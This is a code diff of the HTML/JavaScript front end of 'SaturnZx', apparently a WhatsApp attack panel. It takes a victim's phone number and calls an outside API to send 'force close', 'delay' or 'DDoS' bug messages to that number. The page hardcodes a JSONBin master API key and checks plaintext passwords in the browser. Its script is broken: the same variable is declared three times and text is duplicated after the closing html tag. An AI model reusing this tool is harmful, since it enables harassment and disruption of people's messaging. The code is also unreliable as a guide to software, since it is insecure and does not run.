@@ -169,14 +169,14 @@
   <h1 class="neon"><i class="fab fa-whatsapp"></i> SaturnZx</h1>
   <input type="text" id="target" placeholder="628xxxx" />
 <div class="bug-options">
-  <div class="bug-card active" data-bug="crashtotal">
+  <div class="bug-card active" data-bug="fcapi">
     <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
   </div>
-  <div class="bug-card" data-bug="ApiDellay">
-    <i class="fas fa-bomb"></i><span>kontol WA</span>
+  <div class="bug-card" data-bug="delay">
+    <i class="fas fa-bomb"></i><span>Delay WA</span>
   </div>
-  <div class="bug-card" data-bug="ApiDellay">
-    <i class="fas fa-clock"></i><span>bangke Delay</span>
+  <div class="bug-card" data-bug="fcunlimited">
+    <i class="fas fa-clock"></i><span>Ddos Wangsaf</span>
   </div>
   <div class="bug-card" data-bug="Blank">
     <i class="fas fa-eye-slash"></i><span>mmk WhatsApp</span>
@@ -216,6 +216,130 @@ particlesJS("particles-js", {
     modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
   },
   retina_detect: true
+});
+
+const BIN_ID = "68a1f57443b1c97be920a7b8";
+const API_KEY = "$2a$10$1nnGj2r8UKaarcXFum.uaenVIF2j1wrnpE5SHAzoobqMFTRC.8lWG";
+const headers = {
+  "Content-Type": "application/json",
+  "X-Master-Key": API_KEY
+};
+
+async function getUsers() {
+  const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
+  const data = await res.json();
+  return data.record;
+}
+
+function logout() {
+  sessionStorage.removeItem("currentUser");
+  location.reload();
+}
+
+function saveSession(user) {
+  sessionStorage.setItem("currentUser", JSON.stringify(user));
+}
+
+function getSession() {
+  return JSON.parse(sessionStorage.getItem("currentUser"));
+}
+
+window.onload = async () => {
+  const user = getSession();
+  if (user) showDashboard(user);
+};
+
+function showPopup(message) {
+  document.getElementById("popup-message").innerHTML = message;
+  document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
+}
+
+async function login() {
+  const user = document.getElementById("username").value.trim();
+  const pass = document.getElementById("password").value.trim();
+  const result = document.getElementById("login-result");
+  const users = await getUsers();
+  const found = users.find(u => u.username === user && u.password === pass);
+
+  if (found) {
+    saveSession(found);
+    showDashboard(found);
+  } else {
+    result.innerText = "❌ Username atau Password salah!";
+    result.style.color = "crimson";
+  }
+}
+
+function showDashboard(user) {
+  document.getElementById("login-box").style.display = "none";
+  document.getElementById("main-box").style.display = "block";
+  document.getElementById("userLabel").innerText = user.username;
+}
+
+let selectedBug = "delay";
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+let selectedBug = "fcunlimited";
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+let selectedBug = "fcapi";
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+async function sendBug() {
+  const input = document.getElementById("target").value.trim();
+  const resDiv = document.getElementById("result");
+  const btn = document.getElementById("sendBtn");
+
+  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
+    resDiv.innerText = "Masukkan nomor WA yang valid!";
+    resDiv.style.color = "crimson";
+    return;
+  }
+
+  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
+  btn.disabled = true;
+  const originalHTML = btn.innerHTML;
+  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
+  resDiv.innerText = "";
+
+try {
+  const res = await fetch(`https://kyxzan-ganzz.404-eror.systems/kyxsan?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
+  const json = await res.json();
+
+  showPopup(`SaturnZx Bug successfully sent to <b>${input}</b>`);
+} catch (err) {
+  resDiv.innerText = "❌ Gagal fetch: " + err;
+  resDiv.style.color = "crimson";
+}
+
+  btn.disabled = false;
+  btn.innerHTML = originalHTML;
+}
+</script>
+</body>
+</html>  retina_detect: true
 });
 
 const BIN_ID = "689ca965d0ea881f40586c31";
